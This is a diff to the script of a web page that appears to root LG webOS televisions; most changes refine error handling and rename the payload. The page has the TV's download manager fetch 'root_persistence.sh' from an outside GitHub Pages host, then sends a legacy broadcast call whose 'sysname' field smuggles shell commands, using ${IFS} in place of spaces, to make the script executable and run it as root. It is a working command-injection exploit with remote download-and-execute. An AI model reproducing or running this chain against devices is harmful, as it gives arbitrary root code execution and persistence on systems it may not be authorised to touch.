@@ -67,15 +67,22 @@
   <script>
     var stateEl = document.getElementById('state');
     var detailEl = document.getElementById('detail');
-    var scriptPath = '/media/internal/downloads/ts.sh';
+    var scriptPath = '/media/internal/downloads/root_persistence.sh';
     var downloadTarget = 'https://azoffshowy.github.io/dangbro/resources/root_persistence.sh';
     var debugMode = new URLSearchParams(window.location.search).has('debug');
-    var settled = false;
 
     function setState(name, detail) {
       stateEl.textContent = name;
       stateEl.className = 'state ' + name;
       detailEl.textContent = detail || '';
+    }
+
+    function failStep(step, detail) {
+      setState('failed', step + ': ' + (detail || 'unknown failure'));
+    }
+
+    function isObject(value) {
+      return value !== null && typeof value === 'object';
     }
 
     function parse(payload) {
@@ -88,12 +95,19 @@
     }
 
     function runLegacyBroadcast() {
+      var settled = false;
       var bridge = new window.PalmServiceBridge();
       bridge.onservicecallback = function (payload) {
+        if (settled) return;
         var parsed = parse(payload);
+        if (!isObject(parsed)) {
+          settled = true;
+          failStep('legacybroadcast inject', 'broadcast call returned an invalid payload');
+          return;
+        }
         if (parsed && parsed.returnValue === false) {
           settled = true;
-          setState('failed', parsed.errorText || 'broadcast call failed');
+          failStep('legacybroadcast inject', parsed.errorText || 'broadcast call failed');
         }
       };
       bridge.call(
@@ -103,33 +117,45 @@
           data: "ciplus20: sub=/ cmd=unbind sysname=';chmod${IFS}+x${IFS}" + scriptPath + ";" + (debugMode ? 'UPLOAD_LOG=1${IFS}' : '') + scriptPath + ";#'"
         })
       );
-      if (!settled) setState('pending', 'inject sent — watch your TV screen for the result');
+      setState('pending', 'inject sent — watch your TV screen for the result. If nothing happens within 10s your TV might be patched.');
     }
 
     function watchDownload(ticket) {
+      var settled = false;
       var bridge = new window.PalmServiceBridge();
       bridge.onservicecallback = function (payload) {
         if (settled) return;
         var parsed = parse(payload);
-        if (!parsed || parsed.returnValue === false) {
+        if (!isObject(parsed)) {
           settled = true;
-          setState('failed', parsed && parsed.errorText ? parsed.errorText : 'status query failed');
+          failStep('download status query', 'status query returned an invalid payload');
+          return;
+        }
+        if (parsed.returnValue === false) {
+          settled = true;
+          failStep('download status query parse', parsed.errorText || 'status query failed');
           return;
         }
         if (parsed.completed === true && parsed.aborted !== true && parsed.interrupted !== true) {
+          settled = true;
           runLegacyBroadcast();
           return;
         }
-        if (parsed.returnValue === false || parsed.aborted === true || parsed.interrupted === true || parsed.state === 'failed') {
+        if (parsed.aborted === true || parsed.interrupted === true || parsed.state === 'failed') {
           settled = true;
-          setState('failed', parsed.errorText || 'download failed');
+          failStep('download status query flag', parsed.errorText || 'download failed');
           return;
         }
         if (typeof parsed.amountReceived !== 'undefined' && typeof parsed.amountTotal !== 'undefined') {
           setState('pending', 'downloading... ' + parsed.amountReceived + ' / ' + parsed.amountTotal + ' bytes');
           return;
         }
-        setState('pending', parsed.target || parsed.state || 'downloading...');
+        if (typeof parsed.target === 'string' || typeof parsed.state === 'string') {
+          setState('pending', parsed.target || parsed.state || 'downloading...');
+          return;
+        }
+        settled = true;
+        failStep('download status query', 'status query returned an unexpected payload');
       };
       bridge.call(
         'luna://com.webos.service.downloadmanager/downloadStatusQuery',
@@ -138,15 +164,13 @@
     }
 
     if (typeof window.PalmServiceBridge === 'undefined') {
-      setState('failed', 'PalmServiceBridge is not available');
+      failStep('bootstrap', 'PalmServiceBridge is not available');
     } else {
       var bridge = new window.PalmServiceBridge();
       bridge.onservicecallback = function (payload) {
-        if (settled) return;
         var parsed = parse(payload);
-        if (!parsed) {
-          settled = true;
-          setState('failed', 'download request returned an empty payload');
+        if (!isObject(parsed)) {
+          failStep('download request', 'download request returned an empty payload');
           return;
         }
         if (parsed.ticket) {
@@ -155,16 +179,17 @@
           return;
         }
         if (parsed.returnValue === false) {
-          settled = true;
-          setState('failed', parsed.errorText || 'download request failed');
+          failStep('download request', parsed.errorText || 'download request failed');
+          return;
         }
+        failStep('download request', 'download request returned an unexpected payload');
       };
       bridge.call(
         'luna://com.webos.service.downloadmanager/download',
         JSON.stringify({
           target: downloadTarget,
           targetDir: '/media/internal/downloads',
-          targetFilename: 'ts.sh',
+          targetFilename: 'root_persistence.sh',
           subscribe: false
         })
       );
